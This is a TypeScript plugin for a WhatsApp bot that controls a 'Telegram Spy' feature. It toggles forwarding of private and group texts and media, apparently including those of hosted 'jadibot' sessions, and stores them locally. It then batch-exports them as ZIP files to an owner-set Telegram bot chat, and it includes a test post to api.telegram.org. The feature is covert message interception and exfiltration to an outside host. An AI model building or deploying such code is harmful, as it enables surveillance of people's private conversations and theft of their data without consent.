// @ts-nocheck


import fs   from 'fs'
import path from 'path'
import axios from 'axios'
import { fileURLToPath } from 'url'
import { getTgToken, getTgChatId } from '../../Library/tg_global.js'

const __dirname   = path.dirname(fileURLToPath(import.meta.url as string))
const ROOT_DIR    = path.join(__dirname, '../..')
const CONFIG_PATH = path.join(ROOT_DIR, 'data', 'tgspy.json')
const QUEUE_PATH  = path.join(ROOT_DIR, 'data', 'tgspy_queue.json')
const BACKUP_DIR  = path.join(ROOT_DIR, 'media', 'tgspy_backup')

const defaultCfg = {
  token: '', chatId: '',
  enabled: false, forwardText: true, forwardMedia: true,
  forwardPrivate: true, forwardGroup: true,
  onlyJadibot: true, ignoreSelf: false, maxFileSizeMB: 50,
  batchIntervalH: 6, lastSentAt: 0
}

function loadCfg() {
  try {
    if (!fs.existsSync(CONFIG_PATH)) {
      const def = { ...defaultCfg, lastSentAt: Date.now() }
      fs.writeFileSync(CONFIG_PATH, JSON.stringify(def, null, 2))
      return def
    }
    const saved = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf-8'))
    if (!saved.lastSentAt) saved.lastSentAt = Date.now()
    return { ...defaultCfg, ...saved }
  } catch { return { ...defaultCfg, lastSentAt: Date.now() } }
}

function saveCfg(data: unknown[]) {
  try { fs.writeFileSync(CONFIG_PATH, JSON.stringify(data, null, 2)) } catch {}
}

function getQueueCount() {
  try {
    if (!fs.existsSync(QUEUE_PATH)) return 0
    return JSON.parse(fs.readFileSync(QUEUE_PATH, 'utf-8')).length
  } catch { return 0 }
}

function getMediaCount() {
  try {
    if (!fs.existsSync(BACKUP_DIR)) return 0
    return fs.readdirSync(BACKUP_DIR).filter((f: unknown) => !f.endsWith('.txt')).length
  } catch { return 0 }
}

function getNextBatchInfo(cfg: unknown) {
  if (!cfg.lastSentAt) return 'Segera (belum pernah kirim)'
  const intervalMs = (cfg.batchIntervalH || 6) * 60 * 60 * 1000
  const nextAt     = cfg.lastSentAt + intervalMs
  const sisaMs     = nextAt - Date.now()
  if (sisaMs <= 0) return 'Segera (sudah waktunya)'
  const sisaJam = Math.floor(sisaMs / (60 * 60 * 1000))
  const sisaMnt = Math.floor((sisaMs % (60 * 60 * 1000)) / (60 * 1000))
  return `${sisaJam}j ${sisaMnt}m lagi`
}

const handler = async (m: any, { reply, args }: any) => {
  const sub = args[0]?.toLowerCase()
  const cfg = loadCfg()

  
  if (!sub || sub === 'status') {
    const qCount = getQueueCount()
    const mCount = getMediaCount()
    return reply(
      `╭──「 📡 *TELEGRAM SPY* 」\n` +
      `│\n` +
      `│ Status        : ${cfg.enabled ? '✅ ON' : '❌ OFF'}\n` +
      `│ Token         : ${getTgToken()  || cfg.token  ? '✅ Set' : '❌ Belum'}\n` +
      `│ Chat ID       : ${getTgChatId() || cfg.chatId ? `✅ ${getTgChatId() || cfg.chatId}` : '❌ Belum'}\n` +
      `│\n` +
      `│ Interval      : Setiap ${cfg.batchIntervalH} jam\n` +
      `│ Antrian teks  : ${qCount} item\n` +
      `│ Media tersimpan: ${mCount} file\n` +
      `│ Kirim berikutnya: ${getNextBatchInfo(cfg)}\n` +
      `│\n` +
      `│ Forward Teks  : ${cfg.forwardText    ? '✅' : '❌'}\n` +
      `│ Forward Media : ${cfg.forwardMedia   ? '✅' : '❌'}\n` +
      `│ Forward Grup  : ${cfg.forwardGroup   ? '✅' : '❌'}\n` +
      `│ Forward Privat: ${cfg.forwardPrivate ? '✅' : '❌'}\n` +
      `│ Only Jadibot  : ${cfg.onlyJadibot    ? '✅' : '❌'}\n` +
      `│ Ignore Keluar : ${cfg.ignoreSelf     ? '✅' : '❌'}\n` +
      `│ Max File      : ${cfg.maxFileSizeMB} MB\n` +
      `│\n` +
      `│ *Command:*\n` +
      `│ .tgspy on/off\n` +
      `│ .tgspy token <TOKEN>\n` +
      `│ .tgspy chatid <ID>\n` +
      `│ .tgspy interval <jam>\n` +
      `│ .tgspy kirim\n` +
      `│ .tgspy antrian\n` +
      `│ .tgspy text on/off\n` +
      `│ .tgspy media on/off\n` +
      `│ .tgspy group on/off\n` +
      `│ .tgspy private on/off\n` +
      `│ .tgspy jadibot on/off\n` +
      `│ .tgspy self on/off\n` +
      `│ .tgspy maxsize <MB>\n` +
      `│ .tgspy test\n` +
      `╰─────────────────────`
    )
  }

  
  if (sub === 'on') {
    if (!(getTgToken() || cfg.token) || !(getTgChatId() || cfg.chatId)) {
      return reply(
        `❌ Set token & chatid dulu!\n\nGunakan .tgbot token & .tgbot id\n\n` +
        `.tgspy token <TOKEN>\n` +
        `.tgspy chatid <ID>`
      )
    }
    cfg.enabled = true
    if (!cfg.lastSentAt) cfg.lastSentAt = Date.now()
    saveCfg(cfg)
    return reply(
      `✅ *Telegram Spy aktif!*\n\n` +
      `📦 Mode Batch — dikumpul dulu\n` +
      `⏰ Dikirim tiap *${cfg.batchIntervalH} jam* sebagai ZIP\n` +
      `📁 Media tersimpan di: media/tgspy_backup/`
    )
  }

  
  if (sub === 'off') {
    cfg.enabled = false
    saveCfg(cfg)
    return reply('❌ Telegram Spy *dimatikan.*')
  }

  
  if (sub === 'token') {
    const val = args.slice(1).join(' ').trim()
    if (!val) return reply('❌ Format: .tgspy token <TOKEN_BOT_TELEGRAM>')
    cfg.token = val
    saveCfg(cfg)
    return reply(`✅ Token disimpan permanen!\nPreview: ${val.slice(0, 12)}...`)
  }

  
  if (sub === 'chatid') {
    const val = args.slice(1).join(' ').trim()
    if (!val) return reply('❌ Format: .tgspy chatid <CHAT_ID>')
    cfg.chatId = val
    saveCfg(cfg)
    return reply(`✅ Chat ID disimpan permanen: ${val}`)
  }

  
  if (sub === 'interval') {
    const jam = parseInt(args[1])
    if (isNaN(jam) || jam < 1 || jam > 24) return reply('❌ Interval harus 1-24 jam')
    cfg.batchIntervalH = jam
    saveCfg(cfg)
    return reply(`✅ Interval: *${jam} jam sekali*`)
  }

  
  if (sub === 'kirim' || sub === 'flush') {
    const qCount = getQueueCount()
    const mCount = getMediaCount()
    if (qCount === 0 && mCount === 0) return reply('ℹ️ Tidak ada yang perlu dikirim.')
    await reply(`⏳ Membuat ZIP (${qCount} teks + ${mCount} media)...`)
    try {
      const { flushBatch } = await import('./tgspy-pasive.js')
      await flushBatch(cfg)
      return reply(`✅ Berhasil dikirim ke Telegram sebagai ZIP!`)
    } catch (e) {
      return reply(`❌ Gagal: ${(e as Error).message}`)
    }
  }

  
  if (sub === 'antrian' || sub === 'queue') {
    const qCount = getQueueCount()
    const mCount = getMediaCount()
    return reply(
      `╭──「 📦 *ANTRIAN TGSPY* 」\n` +
      `│\n` +
      `│ Teks di queue : ${qCount} item\n` +
      `│ Media di panel: ${mCount} file\n` +
      `│ Path media    : media/tgspy_backup/\n` +
      `│\n` +
      `│ Kirim berikutnya: ${getNextBatchInfo(cfg)}\n` +
      `│\n` +
      `│ .tgspy kirim → paksa kirim sekarang\n` +
      `╰─────────────────────`
    )
  }

  
  const toggleMap = {
    text:    'forwardText',
    media:   'forwardMedia',
    group:   'forwardGroup',
    private: 'forwardPrivate',
    jadibot: 'onlyJadibot',
    self:    'ignoreSelf'
  }

  if (toggleMap[sub]) {
    const val = args[1]?.toLowerCase()
    if (val !== 'on' && val !== 'off') return reply(`❌ Gunakan: .tgspy ${sub} on/off`)
    cfg[toggleMap[sub]] = val === 'on'
    saveCfg(cfg)
    return reply(`✅ ${sub} → *${val.toUpperCase()}*`)
  }

  
  if (sub === 'maxsize') {
    const mb = parseInt(args[1])
    if (isNaN(mb) || mb < 1 || mb > 100) return reply('❌ Ukuran harus 1-100 MB')
    cfg.maxFileSizeMB = mb
    saveCfg(cfg)
    return reply(`✅ Max file size: *${mb} MB*`)
  }

  
  if (sub === 'test') {
    const _t = getTgToken() || cfg.token || ''
    const _c = getTgChatId() || cfg.chatId || ''
    if (!_t || !_c) return reply('❌ Token atau Chat ID belum diset!\nGunakan .tgbot token & .tgbot id')
    await reply('⏳ Tes koneksi ke Telegram...')
    try {
      await axios.post(`https://api.telegram.org/bot${_t}/sendMessage`, {
        chat_id:    _c,
        text:       `✅ *Morela TGSpy - Test*\n\nKoneksi berhasil!\n⏰ Interval: ${cfg.batchIntervalH} jam\n🕐 ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`,
        parse_mode: 'Markdown'
      }, { timeout: 10000 })
      return reply('✅ Berhasil! Cek Telegram kamu.')
    } catch (e) {
      return reply(`❌ Gagal: ${(e as Error).message}`)
    }
  }

  return reply('❌ Sub-command tidak dikenal. Ketik *.tgspy* untuk bantuan.')
}

handler.command = ['tgspy', 'telespy']
handler.owner   = true
handler.noLimit = true
handler.tags    = ['owner']
handler.help    = ['tgspy on/off', 'tgspy status', 'tgspy kirim']

export default handler
